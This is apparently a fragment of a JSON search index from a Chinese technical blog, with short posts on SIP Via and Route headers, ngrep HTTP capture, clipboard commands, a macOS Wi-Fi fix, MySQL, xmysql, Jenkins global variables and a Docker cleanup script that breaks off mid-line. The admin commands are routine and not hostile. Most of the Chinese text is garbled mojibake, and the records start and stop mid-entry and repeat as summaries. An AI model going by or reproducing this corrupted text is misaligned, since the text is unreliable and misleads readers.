å“åº”æŒ‰ç…§Viaå­—æ®µå‘å‰èµ° route headersÂ è¯·æ±‚æŒ‰ç…§routeå­—æ®µå‘å‰èµ° Viaå¤´ å½“uacå‘é€è¯·æ±‚æ—¶, æ¯ä¸ªuaéƒ½ä¼šåŠ ä¸Šè‡ªå·±çš„viaå¤´, viaéƒ½çš„é¡ºåºå¾ˆé‡è¦ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦å°†è‡ªå·±çš„Viaå¤´åŠ åœ¨æœ€ä¸Šé¢ å“åº”æ¶ˆæ¯æŒ‰ç…§viaå¤´è®°å½•çš„åœ°å€è¿”å›ï¼Œæ¯æ¬¡ç»è¿‡è‡ªå·±çš„nodeæ—¶å€™ï¼Œè¦å»æ‰è‡ªå·±çš„viaå¤´ viaç”¨æ¥æŒ‡æ˜æ¶ˆæ¯åº”è¯¥æŒ‰ç…§ä»€ä¹ˆ Routeå¤´ è·¯ç”±æ¨¡å— æ¨¡å— CARRIERROUTE DISPATCHER DROUTING LOAD_BALANCER ","permalink":"https://wdd.js.org/opensips/ch5/via-route/","summary":"ä¸¤ç§å¤´ via headersÂ å“åº”æŒ‰ç…§Viaå­—æ®µå‘å‰èµ° route headersÂ è¯·æ±‚æŒ‰ç…§routeå­—æ®µå‘å‰èµ° Viaå¤´ å½“uacå‘é€è¯·æ±‚æ—¶, æ¯ä¸ªuaéƒ½ä¼šåŠ ä¸Šè‡ªå·±çš„viaå¤´, viaéƒ½çš„é¡ºåºå¾ˆé‡è¦ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦å°†è‡ªå·±çš„Viaå¤´åŠ åœ¨æœ€ä¸Šé¢ å“åº”æ¶ˆæ¯æŒ‰ç…§viaå¤´è®°å½•çš„åœ°å€è¿”å›ï¼Œæ¯æ¬¡ç»è¿‡è‡ªå·±çš„nodeæ—¶å€™ï¼Œè¦å»æ‰è‡ªå·±çš„viaå¤´ viaç”¨æ¥æŒ‡æ˜æ¶ˆæ¯åº”è¯¥æŒ‰ç…§ä»€ä¹ˆ Routeå¤´ è·¯ç”±æ¨¡å— æ¨¡å— CARRIERROUTE DISPATCHER DROUTING LOAD_BALANCER ","title":"SIPè·¯ç”±å¤´"},{"content":"ä¸€èˆ¬ä½¿ç”¨tcpdumpæŠ“åŒ…ï¼Œç„¶åå°†åŒ…æ–‡ä»¶ä¸‹è½½åˆ°æœ¬æœºï¼Œç”¨wiresharkå»è§£æè¿‡æ»¤ã€‚\nä½†æ˜¯è¿™æ ·ä¼šæ˜¾å¾—æ¯”è¾ƒéº»çƒ¦ã€‚\nngrepå¯ä»¥ç›´æ¥åœ¨linuxè½¬åŒ…ï¼Œæ˜æ–‡æŸ¥çœ‹httpçš„è¯·æ±‚å’Œå“åº”ä¿¡æ¯ã€‚\nå®‰è£… apt install ngrep # debian yum install ngrep # centos7 # å¦‚æœcentosæŠ¥é”™æ²¡æœ‰ngrep, é‚£ä¹ˆæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤, ç„¶åå†å®‰è£… rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm HTTPæŠ“åŒ… -W byline å¤´ä¿¡æ¯ä¼šè‡ªåŠ¨æ¢è¡Œ host 192.168.60.200Â æ˜¯è¿‡æ»¤è§„åˆ™ æºipæˆ–è€…ç›®çš„ipæ˜¯192.168.60.200 ngrep -W byline host 192.168.60.200 interface: eth0 (192.168.1.0/255.255.255.0) filter: (ip or ip6) and ( host 192.168.60.200 ) #### T 192.168.1.102:39510 -\u0026gt; 192.168.60.200:7775 [AP] GET / HTTP/1.1. Host: 192.168.60.200:7775. User-Agent: curl/7.52.1. Accept: */*. . # T 192.168.60.200:7775 -\u0026gt; 192.168.1.102:39510 [AP] HTTP/1.1 302 Moved Temporarily. Server: Apache-Coyote/1.1. Set-Cookie: JSESSIONID=211CA612EC681B9FDCE7726B03F42088; Path=/; HttpOnly. Location: http://192.168.60.200:7775/homepage.action. Content-Type: text/html. Content-Length: 0. Date: Fri, 16 Aug 2019 02:16:51 GMT. è¿‡æ»¤è§„åˆ™ æŒ‰IPåœ°å€è¿‡æ»¤ ngrep -W byline host 192.168.60.200 # æºåœ°å€æˆ–è€…ç›®çš„åœ°å€æ˜¯ 192.168.60.200 æŒ‰ç«¯å£è¿‡æ»¤ ngrep -W byline port 80 # æºç«¯å£æˆ–è€…ç›®çš„ç«¯å£æ˜¯ 80 æŒ‰ç…§æ­£åˆ™åŒ¹é… ngrep -W byline -q HTTP # åŒ¹é…æ‰€æœ‰åŒ…ä¸­å«æœ‰HTTPçš„ æŒ‡å®šç½‘å¡ é»˜è®¤æƒ…å†µä¸‹ï¼Œngrepä½¿ç”¨ç½‘å¡åˆ—è¡¨ä¸­çš„ä¸€ä¸ªç½‘å¡ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨-dé€‰é¡¹æ¥æŒ‡å®šæŠ“åŒ…æŸä¸ªç½‘å¡ã€‚\nngrep -W byline -d eth0 host 192.168.60.200 å‚è€ƒ https://www.tecmint.com/ngrep-network-packet-analyzer-for-linux/ https://github.com/jpr5/ngrep ","permalink":"https://wdd.js.org/network/pxn896/","summary":"ä¸€èˆ¬ä½¿ç”¨tcpdumpæŠ“åŒ…ï¼Œç„¶åå°†åŒ…æ–‡ä»¶ä¸‹è½½åˆ°æœ¬æœºï¼Œç”¨wiresharkå»è§£æè¿‡æ»¤ã€‚\nä½†æ˜¯è¿™æ ·ä¼šæ˜¾å¾—æ¯”è¾ƒéº»çƒ¦ã€‚\nngrepå¯ä»¥ç›´æ¥åœ¨linuxè½¬åŒ…ï¼Œæ˜æ–‡æŸ¥çœ‹httpçš„è¯·æ±‚å’Œå“åº”ä¿¡æ¯ã€‚\nå®‰è£… apt install ngrep # debian yum install ngrep # centos7 # å¦‚æœcentosæŠ¥é”™æ²¡æœ‰ngrep, é‚£ä¹ˆæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤, ç„¶åå†å®‰è£… rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm HTTPæŠ“åŒ… -W byline å¤´ä¿¡æ¯ä¼šè‡ªåŠ¨æ¢è¡Œ host 192.168.60.200Â æ˜¯è¿‡æ»¤è§„åˆ™ æºipæˆ–è€…ç›®çš„ipæ˜¯192.168.60.200 ngrep -W byline host 192.168.60.200 interface: eth0 (192.168.1.0/255.255.255.0) filter: (ip or ip6) and ( host 192.168.60.200 ) #### T 192.168.1.102:39510 -\u0026gt; 192.168.60.200:7775 [AP] GET / HTTP/1.1. Host: 192.168.60.200:7775. User-Agent: curl/7.52.1. Accept: */*. . # T 192.168.60.200:7775 -\u0026gt; 192.168.1.102:39510 [AP] HTTP/1.1 302 Moved Temporarily.","title":"ngrepæ˜æ–‡httpæŠ“åŒ…æ•™ç¨‹"},{"content":"ä¸€èˆ¬æ‹·è´å…¨æ–‡åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥\nä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ å…¨æ–‡é€‰æ‹©æ–‡ä»¶ æ‰§è¡Œæ‹·è´å‘½ä»¤ å®é™…ä¸Šæ“ä½œç³»ç»Ÿæä¾›äº†ä¸€äº›å‘½ä»¤ï¼Œå¯ä»¥åœ¨ä¸æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œå°†æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿ã€‚\nmac pbcopy cat aaa.txt | pbcopy linuxÂ xsel cat aaa.txt | xsel windows clip cat aaa.txt | clip ","permalink":"https://wdd.js.org/posts/2019/08/iyotwd/","summary":"ä¸€èˆ¬æ‹·è´å…¨æ–‡åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥\nä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ å…¨æ–‡é€‰æ‹©æ–‡ä»¶ æ‰§è¡Œæ‹·è´å‘½ä»¤ å®é™…ä¸Šæ“ä½œç³»ç»Ÿæä¾›äº†ä¸€äº›å‘½ä»¤ï¼Œå¯ä»¥åœ¨ä¸æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œå°†æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿ã€‚\nmac pbcopy cat aaa.txt | pbcopy linuxÂ xsel cat aaa.txt | xsel windows clip cat aaa.txt | clip ","title":"åœ¨ä¸æ‰“å¼€æ–‡ä»¶ï¼Œå°†å…¨æ–‡å¤åˆ¶åˆ°å‰ªè´´æ¿"},{"content":"è§£å†³æ–¹æ¡ˆ æ–¹æ¡ˆ1ï¼š sudo kill -9 `ps aux | grep -v grep | grep /usr/libexec/airportd | awk \u0026#39;{print $2}\u0026#39;` æˆ–è€…ä»»åŠ¡ç®¡ç†å™¨æœç´¢å¹¶ä¸”æ€æ‰airportdè¿™ä¸ªè¿›ç¨‹\nå‚è€ƒ https://discussionschinese.apple.com/thread/140138832?answerId=140339277322#140339277322 https://www.v2ex.com/t/505737 https://blog.csdn.net/Goals1989/article/details/88578012 ","permalink":"https://wdd.js.org/posts/2019/08/gw9eka/","summary":"è§£å†³æ–¹æ¡ˆ æ–¹æ¡ˆ1ï¼š sudo kill -9 `ps aux | grep -v grep | grep /usr/libexec/airportd | awk \u0026#39;{print $2}\u0026#39;` æˆ–è€…ä»»åŠ¡ç®¡ç†å™¨æœç´¢å¹¶ä¸”æ€æ‰airportdè¿™ä¸ªè¿›ç¨‹\nå‚è€ƒ https://discussionschinese.apple.com/thread/140138832?answerId=140339277322#140339277322 https://www.v2ex.com/t/505737 https://blog.csdn.net/Goals1989/article/details/88578012 ","title":"macbook pro å¼€æœºåwifiæ— å“åº”é—®é¢˜è°ƒç ”"},{"content":"ç¼–è¾‘/etc/my.cnfï¼Œå¢åŠ skip-name-resolve\nskip-name-resolve ç„¶åé‡å¯mysql\n","permalink":"https://wdd.js.org/posts/2019/08/kieuga/","summary":"ç¼–è¾‘/etc/my.cnfï¼Œå¢åŠ skip-name-resolve\nskip-name-resolve ç„¶åé‡å¯mysql","title":"mysqlè¿œç¨‹è¿æ¥é€Ÿåº¦å¤ªæ…¢"},{"content":"githubå‘æˆ‘æ¨èè¿™ä¸ªxmysqlæ—¶å€™ï¼Œæˆ‘çŸäº†ä¸€çœ¼å®ƒçš„ç®€ä»‹One command to generate REST APIs for any MySql Database, è¯´å®è¯è¿™ä¸ªä»‹ç»è®©æˆ‘çœ¼å‰ä¸€äº®ï¼Œæƒ³æƒ³æ¯æ¬¡å‘åç«¯çš„åŒå­¦è¦ä¸ªæ¥å£çš„æ—¶å€™ï¼Œä»–ä»¬æ€»æ˜¯è¦å“¼å“§å“¼å“§æä¸ªåŠå¤©ç»™æ‰èƒ½æˆ‘ã€‚æŠ±ç€è¯•è¯•çœ‹çš„å¿ƒæ€ï¼Œæˆ‘è¯•ç”¨äº†ä¸€ä¸ªç–—ç¨‹ï¼Œohä¸æ˜¯ï¼Œ æ˜¯å®‰è£…å¹¶ä½¿ç”¨äº†ä¸€ä¸‹ã€‚ è¯´å®è¯ï¼Œä½“éªŒæ˜¯è›®ä¸é”™çš„ï¼Œä½†æ˜¯ä½“éªŒä¸€æŠŠè¿‡åï¼Œæˆ‘æƒ³ä¸åˆ°è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨åœºæ™¯ï¼Œå› ä¸ºä½ ä¸å¯èƒ½æŠŠæ•°æ®åº“çš„æ‰€æœ‰è¡¨éƒ½å…¬å¼€å‡ºæ¥ï¼Œè®©å‰ç«¯éšæ„è¯»å†™,Â ä½†æ˜¯è¯•è¯•çœ‹æ€»æ˜¯ä¸é”™çš„.\n1 æ¥å§ï¼Œå†’é™©ä¸€æ¬¡ï¼ å®‰è£…ä¸ä½¿ç”¨\nnpm install -g xmysqlxmysql -h localhost -u mysqlUsername -p mysqlPassword -d databaseNameæµè§ˆå™¨æ‰“å¼€ï¼šhttp://localhost:3000ï¼Œ åº”è¯¥å¯ä»¥çœ‹åˆ°ä¸€å †json 2 ç‰¹ç‚¹ äº§ç”ŸREST Apiä»ä»»ä½•mysql æ•°æ®åº“ ğŸ”¥ğŸ”¥ æ— è®ºä¸»é”®ï¼Œå¤–é”®ï¼Œè¡¨ç­‰çš„å‘½åè§„åˆ™å¦‚ä½•ï¼Œéƒ½æä¾›API ğŸ”¥ğŸ”¥ æ”¯æŒå¤åˆä¸»é”® ğŸ”¥ğŸ”¥ REST APIé€šå¸¸ä½¿ç”¨ï¼šCRUDï¼ŒListï¼ŒFindOneï¼ŒCountï¼ŒExistsï¼ŒDistinctæ‰¹é‡æ’å…¥ï¼Œæ‰¹é‡åˆ é™¤ï¼Œæ‰¹é‡è¯»å– ğŸ”¥ å…³è”è¡¨ ç¿»é¡µ æ’åº æŒ‰å­—æ®µè¿‡æ»¤ ğŸ”¥ è¡Œè¿‡æ»¤ ğŸ”¥ ç»¼åˆåŠŸèƒ½ Group By, Having (as query params) ğŸ”¥ğŸ”¥ Group By, Having (as a separate API) ğŸ”¥ğŸ”¥ Multiple group by in one API ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ Chart API for numeric column ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ Auto Chart API - (a gift for lazy while prototyping) ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ XJOIN - (Supports any number of JOINS) ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ Supports views Prototyping (features available when using local MySql server only) Run dynamic queries ğŸ”¥ğŸ”¥ğŸ”¥ Upload single file Upload multiple files Download file 3 API æ¦‚è§ˆ HTTP Type API URL Comments GET / Gets all REST APIs GET /api/tableName Lists rows of table POST /api/tableName Create a new row PUT /api/tableName Replaces existing row with new row POST :fire: /api/tableName/bulk Create multiple rows - send object array in request body GET :fire: /api/tableName/bulk Lists multiple rows - /api/tableName/bulk?_ids=1,2,3 DELETE :fire: /api/tableName/bulk Deletes multiple rows - /api/tableName/bulk?_ids=1,2,3 GET /api/tableName/:id Retrieves a row by primary key PATCH /api/tableName/:id Updates row element by primary key DELETE /api/tableName/:id Delete a row by primary key GET /api/tableName/findOne Works as list but gets single record matching criteria GET /api/tableName/count Count number of rows in a table GET /api/tableName/distinct Distinct row(s) in table - /api/tableName/distinct?_fields=col1 GET /api/tableName/:id/exists True or false whether a row exists or not GET /api/parentTable/:id/childTable Get list of child table rows with parent table foreign key GET :fire: /api/tableName/aggregate Aggregate results of numeric column(s) GET :fire: /api/tableName/groupby Group by results of column(s) GET :fire: /api/tableName/ugroupby Multiple group by results using one call GET :fire: /api/tableName/chart Numeric column distribution based on (min,max,step) or(step array) or (automagic) GET :fire: /api/tableName/autochart Same as Chart but identifies which are numeric column automatically - gift for lazy while prototyping GET :fire: /api/xjoin handles join GET :fire: /dynamic execute dynamic mysql statements with params GET :fire: /upload upload single file GET :fire: /uploads upload multiple files GET :fire: /download download a file GET /api/tableName/describe describe each table for its columns GET /api/tables get all tables in database 3 æ›´å¤šèµ„æ–™ é¡¹ç›®åœ°å€ï¼šhttps://github.com/o1lab/xmysql ","permalink":"https://wdd.js.org/posts/2019/08/vv5oro/","summary":"githubå‘æˆ‘æ¨èè¿™ä¸ªxmysqlæ—¶å€™ï¼Œæˆ‘çŸäº†ä¸€çœ¼å®ƒçš„ç®€ä»‹One command to generate REST APIs for any MySql Database, è¯´å®è¯è¿™ä¸ªä»‹ç»è®©æˆ‘çœ¼å‰ä¸€äº®ï¼Œæƒ³æƒ³æ¯æ¬¡å‘åç«¯çš„åŒå­¦è¦ä¸ªæ¥å£çš„æ—¶å€™ï¼Œä»–ä»¬æ€»æ˜¯è¦å“¼å“§å“¼å“§æä¸ªåŠå¤©ç»™æ‰èƒ½æˆ‘ã€‚æŠ±ç€è¯•è¯•çœ‹çš„å¿ƒæ€ï¼Œæˆ‘è¯•ç”¨äº†ä¸€ä¸ªç–—ç¨‹ï¼Œohä¸æ˜¯ï¼Œ æ˜¯å®‰è£…å¹¶ä½¿ç”¨äº†ä¸€ä¸‹ã€‚ è¯´å®è¯ï¼Œä½“éªŒæ˜¯è›®ä¸é”™çš„ï¼Œä½†æ˜¯ä½“éªŒä¸€æŠŠè¿‡åï¼Œæˆ‘æƒ³ä¸åˆ°è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨åœºæ™¯ï¼Œå› ä¸ºä½ ä¸å¯èƒ½æŠŠæ•°æ®åº“çš„æ‰€æœ‰è¡¨éƒ½å…¬å¼€å‡ºæ¥ï¼Œè®©å‰ç«¯éšæ„è¯»å†™,Â ä½†æ˜¯è¯•è¯•çœ‹æ€»æ˜¯ä¸é”™çš„.\n1 æ¥å§ï¼Œå†’é™©ä¸€æ¬¡ï¼ å®‰è£…ä¸ä½¿ç”¨\nnpm install -g xmysqlxmysql -h localhost -u mysqlUsername -p mysqlPassword -d databaseNameæµè§ˆå™¨æ‰“å¼€ï¼šhttp://localhost:3000ï¼Œ åº”è¯¥å¯ä»¥çœ‹åˆ°ä¸€å †json 2 ç‰¹ç‚¹ äº§ç”ŸREST Apiä»ä»»ä½•mysql æ•°æ®åº“ ğŸ”¥ğŸ”¥ æ— è®ºä¸»é”®ï¼Œå¤–é”®ï¼Œè¡¨ç­‰çš„å‘½åè§„åˆ™å¦‚ä½•ï¼Œéƒ½æä¾›API ğŸ”¥ğŸ”¥ æ”¯æŒå¤åˆä¸»é”® ğŸ”¥ğŸ”¥ REST APIé€šå¸¸ä½¿ç”¨ï¼šCRUDï¼ŒListï¼ŒFindOneï¼ŒCountï¼ŒExistsï¼ŒDistinctæ‰¹é‡æ’å…¥ï¼Œæ‰¹é‡åˆ é™¤ï¼Œæ‰¹é‡è¯»å– ğŸ”¥ å…³è”è¡¨ ç¿»é¡µ æ’åº æŒ‰å­—æ®µè¿‡æ»¤ ğŸ”¥ è¡Œè¿‡æ»¤ ğŸ”¥ ç»¼åˆåŠŸèƒ½ Group By, Having (as query params) ğŸ”¥ğŸ”¥ Group By, Having (as a separate API) ğŸ”¥ğŸ”¥ Multiple group by in one API ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ Chart API for numeric column ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ Auto Chart API - (a gift for lazy while prototyping) ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ XJOIN - (Supports any number of JOINS) ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ Supports views Prototyping (features available when using local MySql server only) Run dynamic queries ğŸ”¥ğŸ”¥ğŸ”¥ Upload single file Upload multiple files Download file 3 API æ¦‚è§ˆ HTTP Type API URL Comments GET / Gets all REST APIs GET /api/tableName Lists rows of table POST /api/tableName Create a new row PUT /api/tableName Replaces existing row with new row POST :fire: /api/tableName/bulk Create multiple rows - send object array in request body GET :fire: /api/tableName/bulk Lists multiple rows - /api/tableName/bulk?","title":"xmysql ä¸€è¡Œå‘½ä»¤ä»ä»»ä½•mysqlæ•°æ®åº“ç”ŸæˆREST API"},{"content":"docker The docker variable offers convenient access to Docker-related functions from a Pipeline script.Methods needing a slave will implicitly run a node {â€¦} block if you have not wrapped them in one. It is a good idea to enclose a block of steps which should all run on the same node in such a block yourself. (If using a Swarm server, or any other specific Docker server, this probably does not matter, but if you are using the default server on localhost it likely will.)Some methods return instances of auxiliary classes which serve as holders for an ID and which have their own methods and properties. Methods taking a body return any value returned by the body itself. Some method parameters are optional and are enclosed with []. Reference:\nwithRegistry(url[, credentialsId]) {â€¦} Specifies a registry URL such as https://docker.mycorp.com/, plus an optional credentials ID to connect to it. withServer(uri[, credentialsId]) {â€¦} Specifies a server URI such as tcp://swarm.mycorp.com:2376, plus an optional credentials ID to connect to it. withTool(toolName) {â€¦} Specifies the name of a Docker installation to use, if any are defined in Jenkins global configuration. If unspecified, docker is assumed to be in the $PATH of the slave agent. image(id) Creates an Image object with a specified name or ID. See below. build(image[, args]) Runs docker build to create and tag the specified image from a Dockerfile in the current directory. Additional args may be added, such as \u0026lsquo;-f Dockerfile.other \u0026ndash;pull \u0026ndash;build-arg http_proxy=http://192.168.1.1:3128 .\u0026rsquo;. Like docker build, args must end with the build context. Returns the resulting Image object. Records a FROM fingerprint in the build. Image.id The image name with optional tag (mycorp/myapp, mycorp/myapp:latest) or ID (hexadecimal hash). Image.run([args, command]) Uses docker run to run the image, and returns a Container which you could stop later. Additional args may be added, such as \u0026lsquo;-p 8080:8080 \u0026ndash;memory-swap=-1\u0026rsquo;. Optional command is equivalent to Docker command specified after the image. Records a run fingerprint in the build. Image.withRun[(args[, command])] {â€¦} Like run but stops the container as soon as its body exits, so you do not need a try-finally block. Image.inside[(args)] {â€¦} Like withRun this starts a container for the duration of the body, but all external commands (sh) launched by the body run inside the container rather than on the host. These commands run in the same working directory (normally a slave workspace), which means that the Docker server must be on localhost. Image.tag([tagname]) Runs docker tag to record a tag of this image (defaulting to the tag it already has). Will rewrite an existing tag if one exists. Image.push([tagname]) Pushes an image to the registry after tagging it as with the tag method. For example, you can use image.push \u0026rsquo;latest\u0026rsquo; to publish it as the latest version in its repository. Image.pull() Runs docker pull. Not necessary before run, withRun, or inside. Image.imageName() The id prefixed as needed with registry information, such as docker.mycorp.com/mycorp/myapp. May be used if running your own Docker commands using sh. Container.id Hexadecimal ID of a running container. Container.stop Runs docker stop and docker rm to shut down a container and remove its storage. Container.port(port) Runs docker port on the container to reveal how the port port is mapped on the host. env Environment variables are accessible from Groovy code as env.VARNAME or simply as VARNAME. You can write to such properties as well (only using the env. prefix):\nenv.MYTOOL_VERSION = \u0026#39;1.33\u0026#39; node { sh \u0026#39;/usr/local/mytool-$MYTOOL_VERSION/bin/start\u0026#39; } These definitions will also be available via the REST API during the build or after its completion, and from upstream Pipeline builds using the build step.However any variables set this way are global to the Pipeline build. For variables with node-specific content (such as file paths), you should instead use the withEnv step, to bind the variable only within a node block.A set of environment variables are made available to all Jenkins projects, including Pipelines. The following is a general list of variables (by name) that are available; see the notes below the list for Pipeline-specific details.\nBRANCH_NAME For a multibranch project, this will be set to the name of the branch being built, for example in case you wish to deploy to production from master but not from feature branches. CHANGE_ID For a multibranch project corresponding to some kind of change request, this will be set to the change ID, such as a pull request number. CHANGE_URL For a multibranch project corresponding to some kind of change request, this will be set to the change URL. CHANGE_TITLE For a multibranch project corresponding to some kind of change request, this will be set to the title of the change. CHANGE_AUTHOR For a multibranch project corresponding to some kind of change request, this will be set to the username of the author of the proposed change. CHANGE_AUTHOR_DISPLAY_NAME For a multibranch project corresponding to some kind of change request, this will be set to the human name of the author. CHANGE_AUTHOR_EMAIL For a multibranch project corresponding to some kind of change request, this will be set to the email address of the author. CHANGE_TARGET For a multibranch project corresponding to some kind of change request, this will be set to the target or base branch to which the change could be merged. BUILD_NUMBER The current build number, such as \u0026ldquo;153\u0026rdquo; BUILD_ID The current build ID, identical to BUILD_NUMBER for builds created in 1.597+, but a YYYY-MM-DD_hh-mm-ss timestamp for older builds **BUILD_DISPLAY_NAME The display name of the current build, which is something like \u0026ldquo;#153\u0026rdquo; by default. JOB_NAME Name of the project of this build, such as \u0026ldquo;foo\u0026rdquo; or \u0026ldquo;foo/bar\u0026rdquo;. (To strip off folder paths from a Bourne shell script, try: ${JOB_NAME##*/}) BUILD_TAG String of \u0026ldquo;jenkins-${JOB_NAME}-${BUILD_NUMBER}\u0026rdquo;. Convenient to put into a resource file, a jar file, etc for easier identification. EXECUTOR_NUMBER The unique number that identifies the current executor (among executors of the same machine) thatâ€™s carrying out this build. This is the number you see in the \u0026ldquo;build executor status\u0026rdquo;, except that the number starts from 0, not 1. NODE_NAME Name of the slave if the build is on a slave, or \u0026ldquo;master\u0026rdquo; if run on master NODE_LABELS Whitespace-separated list of labels that the node is assigned. WORKSPACE The absolute path of the directory assigned to the build as a workspace. JENKINS_HOME The absolute path of the directory assigned on the master node for Jenkins to store data. JENKINS_URL Full URL of Jenkins, like http://server:port/jenkins/ (note: only available if Jenkins URL set in system configuration) BUILD_URL Full URL of this build, like http://server:port/jenkins/job/foo/15/ (Jenkins URL must be set) JOB_URL Full URL of this job, like http://server:port/jenkins/job/foo/ (Jenkins URL must be set) The following variables are currently unavailable inside a Pipeline script: SCM-specific variables such as SVN_REVISION As an example of loading variable values from Groovy: mail to: \u0026#39;devops@acme.com\u0026#39;, subject: \u0026#34;Job \u0026#39;${JOB_NAME}\u0026#39; (${BUILD_NUMBER}) is waiting for input\u0026#34;, body: \u0026#34;Please go to ${BUILD_URL} and verify the build\u0026#34; params Exposes all parameters defined in the build as a read-only map with variously typed values. Example:\nif (params.BOOLEAN_PARAM_NAME) {doSomething()} Note for multibranch (Jenkinsfile) usage: the properties step allows you to define job properties, but these take effect when the step is run, whereas build parameter definitions are generally consulted before the build begins. As a convenience, any parameters currently defined in the job which have default values will also be listed in this map. That allows you to write, for example:properties([parameters([string(name: \u0026lsquo;BRANCH\u0026rsquo;, defaultValue: \u0026lsquo;master\u0026rsquo;)])])\ngit url: \u0026#39;â€¦\u0026#39;, branch: params.BRANCH and be assured that the master branch will be checked out even in the initial build of a branch project, or if the previous build did not specify parameters or used a different parameter name.\ncurrentBuild The currentBuild variable may be used to refer to the currently running build. It has the following readable properties:\nnumber build number (integer) result typically SUCCESS, UNSTABLE, or FAILURE (may be null for an ongoing build) currentResult typically SUCCESS, UNSTABLE, or FAILURE. Will never be null. resultIsBetterOrEqualTo(String) Compares the current build result to the provided result string (SUCCESS, UNSTABLE, or FAILURE) and returns true if the current build result is better than or equal to the provided result. resultIsWorseOrEqualTo(String) Compares the current build result to the provided result string (SUCCESS, UNSTABLE, or FAILURE) and returns true if the current build result is worse than or equal to the provided result. displayName normally #123 but sometimes set to, e.g., an SCM commit identifier description additional information about the build id normally number as a string timeInMillis time since the epoch when the build was scheduled startTimeInMillis time since the epoch when the build started running duration duration of the build in milliseconds durationString a human-readable representation of the build duration previousBuild another similar object, or null nextBuild similarly absoluteUrl URL of build index page buildVariables for a non-Pipeline downstream build, offers access to a map of defined build variables; for a Pipeline downstream build, any variables set globally on env changeSets a list of changesets coming from distinct SCM checkouts; each has a kind and is a list of commits; each commit has a commitId, timestamp, msg, author, and affectedFiles each of which has an editType and path; the value will not generally be Serializable so you may only access it inside a method marked @NonCPS rawBuild a hudson.model.Run with further APIs, only for trusted libraries or administrator-approved scripts outside the sandbox; the value will not be Serializable so you may only access it inside a method marked @NonCPS Additionally, for this build only (but not for other builds), the following properties are writable: result displayName description scm Represents the SCM configuration in a multibranch project build. Use checkout scm to check out sources matching Jenkinsfile.You may also use this in a standalone project configured with Pipeline script from SCM, though in that case the checkout will just be of the latest revision in the branch, possibly newer than the revision from which the Pipeline script was loaded.\nå‚è€ƒ Global Variable Reference ","permalink":"https://wdd.js.org/posts/2019/08/tdeab2/","summary":"docker The docker variable offers convenient access to Docker-related functions from a Pipeline script.Methods needing a slave will implicitly run a node {â€¦} block if you have not wrapped them in one. It is a good idea to enclose a block of steps which should all run on the same node in such a block yourself. (If using a Swarm server, or any other specific Docker server, this probably does not matter, but if you are using the default server on localhost it likely will.","title":"Jenkins å…¨å±€å˜é‡å‚è€ƒ"},{"content":"ä½¿ç”¨ jenkins ä½œä¸ºæ‰“åŒ…çš„å·¥å…·ï¼Œä¸»æœºä¸Šçš„ç£ç›˜ç©ºé—´æ€»æ˜¯è¢«æ…¢æ…¢è¢«å æ»¡ï¼Œç›´åˆ° jenkins æ— æ³•è¿è¡Œã€‚æœ¬æ–‡ä»å‡ ä¸ªæ–¹é¢æ¥æ¸…ç† docker åƒåœ¾ã€‚\næ‰¹é‡åˆ é™¤å·²ç»é€€å‡ºçš„å®¹å™¨ docker ps -a | grep \u0026#34;Exited\u0026#34; | awk \u0026#39;{print $1 }\u0026#39; | xargs docker rm æ‰¹é‡åˆ é™¤å¸¦æœ‰ none å­—æ®µçš„é•œåƒ $3 ä¸€èˆ¬å°±æ˜¯å–å‡ºæ¯ä¸€è¡Œçš„é•œåƒ id å­—æ®µ\n# æ–¹æ¡ˆ1ï¼š æ ¹æ®é•œåƒidåˆ é™¤é•œåƒ docker images| grep none |awk \u0026#39;{print $3 }\u0026#39;|xargs docker rmi # æ–¹æ¡ˆ2: æ ¹æ®é•œåƒååˆ é™¤é•œåƒ docker images | grep wecloud | awk \u0026#39;{print $1\u0026#34;:\u0026#34;$2}\u0026#39; | xargs docker rmi æ–¹æ¡ˆ 1ï¼Œæ ¹æ®é•œåƒ ID åˆ é™¤é•œåƒæ—¶ï¼Œæœ‰å†™é•œåƒè™½ç„¶é•œåƒåä¸åŒï¼Œä½†æ˜¯é•œåƒ ID éƒ½æ˜¯ç›¸åŒçš„ï¼Œè¿™æ˜¯åå¾€å¾€ä¼šåˆ é™¤å¤±è´¥ã€‚æ‰€ä»¥æ ¹æ®é•œåƒååˆ é™¤é•œåƒçš„æ•ˆæœä¼šæ›´å¥½ã€‚\nåˆ é™¤é•œåƒå®šæ—¶ä»»åŠ¡è„šæœ¬ #!/bin/bash # create by wangduanduan # when current free disk less then max free disk, you can remove docker images # GREEN=\u0026#39;\\033[0;32m\u0026#39; RED=\u0026#39;\\033[0;31m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; max_free_disk=5 # 5G. when current free disk less then max free disk, remove docker images current_free_disk=`df -lh | grep centos-root | awk \u0026#39;{print strtonum($4)}\u0026#39;` df -lh echo 